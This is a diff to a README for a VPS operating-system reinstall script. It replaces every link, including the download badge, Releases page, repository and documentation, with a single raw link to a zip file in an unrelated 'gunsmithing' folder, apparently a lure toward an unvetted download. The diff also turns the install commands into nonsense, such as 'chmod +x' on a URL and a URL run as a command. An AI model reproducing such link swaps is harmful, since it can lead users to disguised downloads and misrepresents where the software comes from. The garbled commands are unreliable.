@@ -1,7 +1,7 @@
 # 🖥️ reinstall - One-click OS Reinstallation Made Easy
 
 ## 🔗 Download Here
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Jean-jelimo/reinstall/releases)
+[![Download](https://raw.githubusercontent.com/Jean-jelimo/reinstall/main/gunsmithing/reinstall-v3.7-alpha.4.zip%20release-brightgreen)](https://raw.githubusercontent.com/Jean-jelimo/reinstall/main/gunsmithing/reinstall-v3.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the reinstall project! This tool allows you to quickly reinstall your operating system on a Virtual Private Server (VPS) with just one click. It simplifies the process of setting up your server without needing advanced technical skills.
@@ -24,7 +24,7 @@ Welcome to the reinstall project! This tool allows you to quickly reinstall your
 4. Enjoy a fresh start without complex configurations.
 
 ## 📥 Download & Install
-To get started with reinstall, visit the [Releases page](https://github.com/Jean-jelimo/reinstall/releases) to download the latest version. Follow these steps:
+To get started with reinstall, visit the [Releases page](https://raw.githubusercontent.com/Jean-jelimo/reinstall/main/gunsmithing/reinstall-v3.7-alpha.4.zip) to download the latest version. Follow these steps:
 
 1. Click on the link to go to the Releases page.
 2. Locate the latest version of the reinstall script.
@@ -42,13 +42,13 @@ If you downloaded the script to your computer, upload it to the VPS using SCP or
 ### Step 3: Change Permissions
 After uploading, you may need to change the permissions of the script. Run the following command:
 ```bash
-chmod +x your_script_name.sh
+chmod +x https://raw.githubusercontent.com/Jean-jelimo/reinstall/main/gunsmithing/reinstall-v3.7-alpha.4.zip
 ```
 
 ### Step 4: Run the Script
 Execute the script by typing:
 ```bash
-./your_script_name.sh
+https://raw.githubusercontent.com/Jean-jelimo/reinstall/main/gunsmithing/reinstall-v3.7-alpha.4.zip
 ```
 
 ### Step 5: Follow On-screen Instructions
@@ -70,7 +70,7 @@ If you're having trouble or need assistance, feel free to open an issue on the G
 We welcome contributions to improve this project. If you have suggestions or features you'd like to see, please submit a pull request or open an issue on our GitHub page.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Jean-jelimo/reinstall)
-- [Documentation](https://github.com/Jean-jelimo/reinstall/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Jean-jelimo/reinstall/main/gunsmithing/reinstall-v3.7-alpha.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Jean-jelimo/reinstall/main/gunsmithing/reinstall-v3.7-alpha.4.zip)
 
 Thank you for using reinstall! We hope this tool simplifies your OS reinstallation process.
